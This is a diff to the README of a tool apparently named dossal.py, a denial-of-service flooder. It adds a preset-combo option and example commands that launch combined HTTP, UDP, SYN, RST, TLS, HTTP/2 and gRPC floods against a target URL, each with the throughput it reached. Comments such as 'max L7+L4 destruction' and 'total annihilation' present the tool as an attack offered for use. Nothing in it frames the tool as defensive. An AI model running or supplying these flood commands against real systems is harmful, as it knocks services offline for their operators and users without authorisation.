@@ -58,6 +58,7 @@ Options:
   --live               Print RPS/PPS every second during attack
   --threads N          Multiprocess count (default 4, max 16)
   --auto               Auto-detect protocol + optimal modes
+  --combo {web,full,tls,proto}  Preset mode combos
   --report FILE        Generate HTML attack report
 ```
 
@@ -106,6 +107,25 @@ python3 dossal.py --auto --url http://target:8080 --duration 30 --live
 # Detects: HTTP/1.1 → runs raw + udp + syn
 # Detects: HTTPS/H2 → runs httpsmp + udp + syn
 # Detects: H2 → runs h2 + grpcmp + udp + syn
+```
+
+## Combo presets
+```bash
+# Web: raw + UDP + SYN (max L7+L4 destruction)
+python3 dossal.py --combo web --url http://target:8080 --duration 30 --live
+# Result: 7,978 RPS + 202k PPS + 16k conns
+
+# Full: raw + UDP + SYN + RST (total annihilation)
+python3 dossal.py --combo full --url http://target:8080 --duration 30 --live
+# Result: 5,848 RPS + 172k PPS + 24k conns
+
+# TLS: httpsmp + h2 + UDP (TLS edge attack)
+python3 dossal.py --combo tls --url https://target:443 --duration 30 --live
+# Result: 193k RPS + 210k PPS
+
+# Proto: grpcmp + h2 + UDP (gRPC/HTTP2 attack)
+python3 dossal.py --combo proto --url https://target:50051 --duration 30 --live
+# Result: 10,340 RPS + 230k PPS
 ```
 
 ## HTML Report
